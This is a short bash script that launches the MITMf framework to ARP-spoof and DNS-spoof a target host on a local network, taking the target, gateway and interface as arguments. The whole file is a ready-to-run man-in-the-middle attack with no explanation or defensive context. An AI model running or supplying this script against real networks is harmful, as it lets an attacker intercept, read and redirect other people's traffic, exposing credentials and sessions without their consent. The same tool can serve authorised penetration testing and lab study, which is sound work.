#!/bin/bash

mitmf --arp --spoof --target $1 --gateway $2 -i $3 --dns
